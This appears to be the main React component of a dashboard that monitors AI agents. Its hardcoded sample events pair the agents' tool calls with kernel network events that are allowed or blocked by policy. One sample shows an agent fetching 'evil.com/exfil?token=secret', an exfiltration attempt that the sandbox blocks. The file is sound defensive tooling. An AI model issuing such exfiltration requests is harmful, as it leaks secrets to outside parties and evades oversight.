import { useMemo, useState } from 'react';
import './App.css';
import Header from './components/Header.jsx';
import AgentTabs from './components/AgentTabs.jsx';
import StatsRow from './components/StatsRow.jsx';
import LLMPanel from './components/LLMPanel.jsx';
import KernelPanel from './components/KernelPanel.jsx';

// Hardcoded fake data so the layout renders fully on first paint.
// Task 3 will replace these with live WebSocket events.

const NOW = Date.now() / 1000;

const FAKE_LLM_EVENTS = [
  { agent: 'demo-agent', type: 'stdout', ts: NOW - 12, data: { line: 'agent: starting task' } },
  {
    agent: 'demo-agent',
    type: 'tool_call',
    ts: NOW - 10,
    data: { tool: 'fetch_url', args: { url: 'https://example.com/docs' } },
  },
  { agent: 'demo-agent', type: 'stdout', ts: NOW - 8, data: { line: 'agent: parsing response' } },
  {
    agent: 'demo-agent',
    type: 'tool_call',
    ts: NOW - 5,
    data: { tool: 'fetch_url', args: { url: 'https://evil.com/exfil?token=secret' } },
  },
  { agent: 'demo-agent', type: 'stdout', ts: NOW - 4, data: { line: 'agent: tool returned error' } },
  { agent: 'file-reader', type: 'stdout', ts: NOW - 3, data: { line: 'reader: opened report.pdf' } },
  { agent: 'demo-agent', type: 'crashed', ts: NOW - 1, data: { exit_code: 1 } },
];

const FAKE_KERNEL_EVENTS = [
  {
    agent: 'demo-agent',
    type: 'connect_attempt',
    ts: NOW - 10,
    data: { dst_ip: '93.184.216.34', dst_port: 443, hostname: 'example.com' },
  },
  {
    agent: 'demo-agent',
    type: 'connect_allowed',
    ts: NOW - 10,
    data: {
      dst_ip: '93.184.216.34',
      dst_port: 443,
      hostname: 'example.com',
      reason: 'in allowed_hosts',
    },
  },
  {
    agent: 'demo-agent',
    type: 'connect_attempt',
    ts: NOW - 5,
    data: { dst_ip: '203.0.113.42', dst_port: 80, hostname: 'evil.com' },
  },
  {
    agent: 'demo-agent',
    type: 'connect_blocked',
    ts: NOW - 5,
    data: {
      dst_ip: '203.0.113.42',
      dst_port: 80,
      hostname: 'evil.com',
      reason: 'no policy match',
    },
  },
  {
    agent: 'file-reader',
    type: 'connect_attempt',
    ts: NOW - 2,
    data: { dst_ip: '10.0.0.5', dst_port: 22, hostname: 'internal.lan' },
  },
];

const FAKE_STATS = { toolCalls: 12, allowed: 9, blocked: 3, uptime: 187 };

export default function App() {
  // wsStatus, llmEvents, kernelEvents, activeAgent, stats: ALL state lives here.
  // Children are pure prop-driven views — Task 3 swaps the fake arrays for live data.
  const [wsStatus] = useState('disconnected');
  const [llmEvents] = useState(FAKE_LLM_EVENTS);
  const [kernelEvents] = useState(FAKE_KERNEL_EVENTS);
  const [stats] = useState(FAKE_STATS);
  const [activeAgent, setActiveAgent] = useState('demo-agent');

  const agents = useMemo(() => {
    const names = new Set();
    for (const e of llmEvents) names.add(e.agent);
    for (const e of kernelEvents) names.add(e.agent);
    return Array.from(names);
  }, [llmEvents, kernelEvents]);

  const filteredLlm = llmEvents.filter((e) => e.agent === activeAgent);
  const filteredKernel = kernelEvents.filter((e) => e.agent === activeAgent);

  return (
    <div className="app">
      <Header wsStatus={wsStatus} />
      <AgentTabs agents={agents} activeAgent={activeAgent} onSelectAgent={setActiveAgent} />
      <StatsRow stats={stats} />
      <div className="app__panels">
        <LLMPanel events={filteredLlm} />
        <KernelPanel events={filteredKernel} />
      </div>
    </div>
  );
}
